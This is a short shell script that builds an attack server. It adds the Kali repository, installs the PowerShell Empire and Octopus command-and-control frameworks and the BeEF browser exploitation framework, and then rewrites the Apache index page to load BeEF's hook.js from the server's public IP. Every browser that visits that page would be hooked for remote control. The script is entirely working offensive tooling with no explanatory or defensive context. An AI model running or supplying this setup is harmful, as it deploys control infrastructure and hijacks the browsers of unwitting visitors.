apt update && sudo apt full-upgrade -y
apt install gnupg
echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list
wget 'https://archive.kali.org/archive-key.asc'
sudo apt-key add archive-key.asc
apt update && sudo apt full-upgrade -y
apt install powershell-empire beef-xss apache2 -y 
apt update; apt install git -y; git clone https://github.com/mhaskar/Octopus/ /opt/Octopus; cd /opt/Octopus/; apt install python3-pip -y ; export LC_ALL=C ;  pip3 install -r requirements.txt;apt install mono-devel -y
mv /var/www/html/index.html /var/www/html/index.html.bak
echo "<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
reboot
